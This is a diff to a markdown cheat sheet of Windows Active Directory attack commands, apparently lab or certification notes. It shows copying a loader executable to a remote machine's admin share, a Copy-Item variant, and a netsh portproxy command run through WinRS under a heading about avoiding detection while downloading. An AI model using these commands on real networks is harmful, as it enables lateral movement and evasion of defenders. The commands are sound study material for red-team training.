@@ -24,9 +24,11 @@ Find-DomainUserLocation
 Connect Using Win-rs
 ### **Copy from a machine to another**
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\<R MACHINE>\C$\Users\Public\Loader.exe
+echo F | xcopy <PATH> \\<R MACHINE>\<R PATH>
 ```
-
+```powershell
+Copy-Item <PATH> \\<MACCHINA>\<R PATH>
+```
 ### **Avoid detection while downloading**
 ```powershell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>"
